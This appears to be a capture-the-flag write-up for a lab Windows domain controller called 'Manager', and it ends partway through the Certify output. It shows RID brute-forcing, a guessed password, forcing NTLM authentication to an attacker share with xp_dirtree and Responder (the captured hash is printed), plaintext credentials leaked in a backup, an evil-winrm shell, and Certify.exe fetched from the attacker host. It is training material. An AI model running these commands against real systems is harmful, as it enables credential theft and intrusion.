# Manager

## Reconnaissance

### Nmap

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -A -T4 -sC -sV -Pn 10.129.109.226
[sudo] password for user: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-21 19:00 UTC
Nmap scan report for 10.129.109.226
Host is up (0.087s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
88/tcp   open  kerberos-sec?
135/tcp  open  msrpc?
139/tcp  open  netbios-ssn?
389/tcp  open  ldap?
|_ssl-date: 2023-10-22T02:02:45+00:00; +7h00m30s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2023-10-22T02:02:45+00:00; +7h00m30s from scanner time.
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.109.226:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.109.226:1433: 
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-10-22T02:01:19
|_Not valid after:  2053-10-22T02:01:19
|_ssl-date: 2023-10-22T02:02:45+00:00; +7h00m30s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 12 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m29s, deviation: 0s, median: 7h00m29s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-10-22T02:02:07
|_  start_date: N/A

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   205.82 ms 10.10.16.1
2   ... 11
12  40.09 ms  10.129.109.226

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.47 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -A -T4 -sC -sV -Pn -p- 10.129.109.226
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-21 19:04 UTC
Nmap scan report for 10.129.109.226
Host is up (0.076s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Manager
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-22 02:06:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-10-22T02:08:01+00:00; +7h00m35s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2023-10-22T02:08:01+00:00; +7h00m36s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.109.226:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2023-10-22T02:08:01+00:00; +7h00m35s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-10-22T02:01:19
|_Not valid after:  2053-10-22T02:01:19
| ms-sql-ntlm-info: 
|   10.129.109.226:1433: 
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-10-22T02:08:01+00:00; +7h00m36s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2023-10-22T02:08:01+00:00; +7h00m36s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49717/tcp open  msrpc         Microsoft Windows RPC
62457/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m35s, deviation: 0s, median: 7h00m34s
| smb2-time: 
|   date: 2023-10-22T02:07:23
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   81.04 ms  10.10.16.1
2   120.02 ms 10.129.109.226

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 194.37 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -sV -sU 10.129.109.226
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-21 19:08 UTC
Nmap scan report for 10.129.109.226
Host is up (0.088s latency).
Not shown: 996 open|filtered udp ports (no-response)
PORT    STATE SERVICE      VERSION
53/udp  open  domain       Simple DNS Plus
88/udp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-10-22 02:09:53Z)
123/udp open  ntp          NTP v3
389/udp open  ldap         Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5097.06 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.109.226  manager.htb
10.129.109.226  dc01.manager.htb
```

### Enumeration of Port 80/TCP

> http://10.129.109.226/

```c
┌──(user㉿kali)-[~]
└─$ whatweb http://10.129.109.226/
http://10.129.109.226/ [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.109.226], JQuery[3.4.1], Microsoft-IIS[10.0], Script[text/javascript], Title[Manager], X-UA-Compatible[IE=edge]
```

### Directory Busting with dirsearch

```c
┌──(user㉿kali)-[~]
└─$ dirsearch -u http://10.129.109.226/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/user/.dirsearch/reports/10.129.109.226/-_23-10-21_19-01-43.txt

Error Log: /home/user/.dirsearch/logs/errors-23-10-21_19-01-43.log

Target: http://10.129.109.226/

[19:01:43] Starting: 
[19:01:44] 403 -  312B  - /%2e%2e//google.com                              
[19:01:45] 301 -  148B  - /js  ->  http://10.129.109.226/js/               
[19:01:53] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[19:01:54] 200 -    5KB - /about.html                                       
[19:02:07] 200 -    5KB - /contact.html                                     
[19:02:07] 301 -  149B  - /css  ->  http://10.129.109.226/css/              
[19:02:13] 403 -    1KB - /images/                                          
[19:02:13] 301 -  152B  - /images  ->  http://10.129.109.226/images/        
[19:02:14] 200 -   18KB - /index.html                                       
[19:02:15] 403 -    1KB - /js/                                              
                                                                             
Task Completed
```

## Enumeration with CrackMapExec

```c
┌──(user㉿kali)-[~]
└─$ crackmapexec smb 10.129.109.226 -u ' ' -p ' ' --shares -M spider_plus -o READ_ONLY=false
[-] Failed loading module at /home/user/.local/pipx/venvs/crackmapexec/lib/python3.11/site-packages/cme/modules/ldap-checker.py: Error detecting the version of libcrypto
SMB         10.129.109.226  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.109.226  445    DC01             [+] manager.htb\ :  
SPIDER_P... 10.129.109.226  445    DC01             [*] Started module spidering_plus with the following options:
SPIDER_P... 10.129.109.226  445    DC01             [*]  DOWNLOAD_FLAG: False
SPIDER_P... 10.129.109.226  445    DC01             [*]     STATS_FLAG: True
SPIDER_P... 10.129.109.226  445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_P... 10.129.109.226  445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_P... 10.129.109.226  445    DC01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_P... 10.129.109.226  445    DC01             [*]  OUTPUT_FOLDER: /tmp/cme_spider_plus
SPIDER_P... 10.129.109.226  445    DC01             [+] Saved share-file metadata to "/tmp/cme_spider_plus/10.129.109.226.json".
SPIDER_P... 10.129.109.226  445    DC01             [*] Total folders found:  0
SPIDER_P... 10.129.109.226  445    DC01             [*] Total files found:    0
```

```c
┌──(user㉿kali)-[~]
└─$ crackmapexec smb 10.129.109.226 -u 'guest'  -p '' --shares --rid-brute
SMB         10.129.109.226  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.109.226  445    DC01             [+] manager.htb\guest: 
SMB         10.129.109.226  445    DC01             [*] Enumerated shares
SMB         10.129.109.226  445    DC01             Share           Permissions     Remark
SMB         10.129.109.226  445    DC01             -----           -----------     ------
SMB         10.129.109.226  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.109.226  445    DC01             C$                              Default share
SMB         10.129.109.226  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.109.226  445    DC01             NETLOGON                        Logon server share 
SMB         10.129.109.226  445    DC01             SYSVOL                          Logon server share 
SMB         10.129.109.226  445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.109.226  445    DC01             500: MANAGER\Administrator (SidTypeUser)
SMB         10.129.109.226  445    DC01             501: MANAGER\Guest (SidTypeUser)
SMB         10.129.109.226  445    DC01             502: MANAGER\krbtgt (SidTypeUser)
SMB         10.129.109.226  445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
SMB         10.129.109.226  445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
SMB         10.129.109.226  445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
SMB         10.129.109.226  445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
SMB         10.129.109.226  445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
SMB         10.129.109.226  445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
SMB         10.129.109.226  445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
SMB         10.129.109.226  445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
SMB         10.129.109.226  445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.109.226  445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.109.226  445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.109.226  445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
SMB         10.129.109.226  445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
SMB         10.129.109.226  445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.109.226  445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.109.226  445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.109.226  445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.109.226  445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
SMB         10.129.109.226  445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
SMB         10.129.109.226  445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.109.226  445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB         10.129.109.226  445    DC01             1113: MANAGER\Zhong (SidTypeUser)
SMB         10.129.109.226  445    DC01             1114: MANAGER\Cheng (SidTypeUser)
SMB         10.129.109.226  445    DC01             1115: MANAGER\Ryan (SidTypeUser)
SMB         10.129.109.226  445    DC01             1116: MANAGER\Raven (SidTypeUser)
SMB         10.129.109.226  445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
SMB         10.129.109.226  445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
SMB         10.129.109.226  445    DC01             1119: MANAGER\Operator (SidTypeUser)
```

| Usernames |
| --- |
| Zhong |
| Cheng |
| Ryan |
| Raven |
| JinWoo |
| ChinHae |
| Operator |

```c
┌──(user㉿kali)-[~]
└─$ crackmapexec smb 10.129.109.226 -u 'operator' -p 'operator'  --shares   
SMB         10.129.109.226  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.109.226  445    DC01             [+] manager.htb\operator:operator 
SMB         10.129.109.226  445    DC01             [*] Enumerated shares
SMB         10.129.109.226  445    DC01             Share           Permissions     Remark
SMB         10.129.109.226  445    DC01             -----           -----------     ------
SMB         10.129.109.226  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.109.226  445    DC01             C$                              Default share
SMB         10.129.109.226  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.109.226  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.109.226  445    DC01             SYSVOL          READ            Logon server share
```

| Username | Password |
| --- | --- |
| operator | operator |

```c
┌──(user㉿kali)-[~]
└─$ crackmapexec smb 10.129.109.226 -u 'operator'  -p 'operator' -M petitpotam
SMB         10.129.109.226  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.109.226  445    DC01             [+] manager.htb\operator:operator 
PETITPOT... 10.129.109.226  445    DC01             VULNERABLE
PETITPOT... 10.129.109.226  445    DC01             Next step: https://github.com/topotam/PetitPotam
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/manager/files]
└─$ bloodhound-python -d 'manager.htb' -u 'operator' -p 'operator' -dc 'dc01.manager.htb' -c ALL -ns 10.129.109.226
INFO: Found AD domain: manager.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (manager.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.manager.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.manager.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.manager.htb
INFO: Done in 00M 16S
```

## Login on MSSQL

```c
┌──(user㉿kali)-[~]
└─$ sqsh -S 'dc01.manager.htb' -U '.\Operator' -P 'operator'
sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>
```

## Grabbing Hash

```c
1> exec master.dbo.xp_dirtree '\\10.10.16.39\FOOBAR'
2> go

        subdirectory                                                                                                                                                                                                                        
                                                                                                                                                                                                                                            
                                                
        depth      

        ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------
        -----------

(0 rows affected, return status = 0)
```

```c
┌──(user㉿kali)-[~]
└─$ sudo responder -I tun0
[sudo] password for user: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.39]
    Responder IPv6             [dead:beef:4::1025]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-YSD7TT8HAWD]
    Responder Domain Name      [BZP1.LOCAL]
    Responder DCE-RPC Port     [47515]

[+] Listening for events...                                                                                                                                                                                                                 

[SMB] NTLMv2-SSP Client   : 10.129.109.226
[SMB] NTLMv2-SSP Username : MANAGER\DC01$
[SMB] NTLMv2-SSP Hash     : DC01$::MANAGER:dd59d71803b9bb67:91A0296CDB3716A7AD146F3BD4FE6B1E:010100000000000000AF2A185604DA018375AF26F4B106B9000000000200080042005A005000310001001E00570049004E002D005900530044003700540054003800480041005700440004003400570049004E002D00590053004400370054005400380048004100570044002E0042005A00500031002E004C004F00430041004C000300140042005A00500031002E004C004F00430041004C000500140042005A00500031002E004C004F00430041004C000700080000AF2A185604DA01060004000200000008003000300000000000000000000000003000008C30B71324F40CBF9F8CAE3493C1B1F43B43ADBEDAB8B4D69B20B14927FAAB490A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330039000000000000000000
```

## Foothold

```c
1> xp_dirtree "C:\inetpub\wwwroot"
2> go

        subdirectory                                                                                                                                                                                                                        
                                                                                                                                                                                                                                            
                                                
        depth      

        ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------
        -----------

        css                                                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
                                                
                  1

        images                                                                                                                                                                                                                              
                                                                                                                                                                                                                                            
                                                
                  1

        js                                                                                                                                                                                                                                  
                                                                                                                                                                                                                                            
                                                
                  1

(3 rows affected, return status = 0)
```

```c
┌──(user㉿kali)-[~]
└─$ sudo mssqlclient.py manager.htb/operator:operator@manager.htb -windows-auth
/usr/local/bin/mssqlclient.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.10.1.dev1+20230909.241.3001b261', 'mssqlclient.py')
Impacket for Exegol - v0.10.1.dev1+20230909.241.3001b261 - Copyright 2022 Fortra - forked by ThePorgs

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (MANAGER\Operator  guest@master)> 
SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub\wwwroot
subdirectory                      depth   file   
-------------------------------   -----   ----   
about.html                            1      1   

contact.html                          1      1   

css                                   1      0   

images                                1      0   

index.html                            1      1   

js                                    1      0   

service.html                          1      1   

web.config                            1      1   

website-backup-27-07-23-old.zip       1      1
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/manager/files]
└─$ wget http://manager.htb/website-backup-27-07-23-old.zip
--2023-10-21 20:33:47--  http://manager.htb/website-backup-27-07-23-old.zip
Resolving manager.htb (manager.htb)... 10.129.109.226
Connecting to manager.htb (manager.htb)|10.129.109.226|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1045328 (1021K) [application/x-zip-compressed]
Saving to: ‘website-backup-27-07-23-old.zip’

website-backup-27-07-23-old.zip                            100%[========================================================================================================================================>]   1021K  1.05MB/s    in 0.9s    

2023-10-21 20:33:48 (1.05 MB/s) - ‘website-backup-27-07-23-old.zip’ saved [1045328/1045328]
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/manager/files]
└─$ unzip website-backup-27-07-23-old.zip 
Archive:  website-backup-27-07-23-old.zip
  inflating: .old-conf.xml           
  inflating: about.html              
  inflating: contact.html            
  inflating: css/bootstrap.css       
  inflating: css/responsive.css      
  inflating: css/style.css           
  inflating: css/style.css.map       
  inflating: css/style.scss          
  inflating: images/about-img.png    
  inflating: images/body_bg.jpg      
 extracting: images/call.png         
 extracting: images/call-o.png       
  inflating: images/client.jpg       
  inflating: images/contact-img.jpg  
 extracting: images/envelope.png     
 extracting: images/envelope-o.png   
  inflating: images/hero-bg.jpg      
 extracting: images/location.png     
 extracting: images/location-o.png   
 extracting: images/logo.png         
  inflating: images/menu.png         
 extracting: images/next.png         
 extracting: images/next-white.png   
  inflating: images/offer-img.jpg    
  inflating: images/prev.png         
 extracting: images/prev-white.png   
 extracting: images/quote.png        
 extracting: images/s-1.png          
 extracting: images/s-2.png          
 extracting: images/s-3.png          
 extracting: images/s-4.png          
 extracting: images/search-icon.png  
  inflating: index.html              
  inflating: js/bootstrap.js         
  inflating: js/jquery-3.4.1.min.js  
  inflating: service.html
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/manager/files]
└─$ cat .old-conf.xml 
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>
```

| Username | Password |
| --- | --- |
| raven | R4v3nBe5tD3veloP3r!123 |

```c
┌──(user㉿kali)-[~]
└─$ evil-winrm -i 10.129.109.226 -u raven -p 'R4v3nBe5tD3veloP3r!123'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Raven\Documents>
```

## user.txt

```c
*Evil-WinRM* PS C:\Users\Raven\Desktop> type user.txt
a68302fc4d760f5eb3ab448811fe30ba
```

## Enumeration

```c
*Evil-WinRM* PS C:\Users\Raven\Desktop> whoami /all

USER INFORMATION
----------------

User Name     SID
============= ==============================================
manager\raven S-1-5-21-4078382237-1492182817-2568127209-1116


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

> https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Certify.exe

```c
*Evil-WinRM* PS C:\Users\Raven\Downloads> iwr 10.10.16.39/Certify.exe -o Certify.exe
```

```c
*Evil-WinRM* PS C:\Users\Raven\Downloads> .\Certify find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=manager,DC=htb'

[*] Listing info about the Enterprise CA 'manager-DC01-CA'

    Enterprise CA Name            : manager-DC01-CA
    DNS Hostname                  : dc01.manager.htb
    FullName                      : dc01.manager.htb\manager-DC01-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=manager-DC01-CA, DC=manager, DC=htb
    Cert Thumbprint               : ACE850A2892B1614526F7F2151EE76E752415023
    Cert Serial                   : 5150CE6EC048749448C7390A52F264BB
    Cert Start Date               : 7/27/2023 3:21:05 AM
    Cert End Date                 : 7/27/2122 3:31:04 AM
    Cert Chain                    : CN=manager-DC01-CA,DC=manager,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Deny   ManageCA, Read                             MANAGER\Operator              S-1-5-21-4078382237-1492182817-2568127209-1119
      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
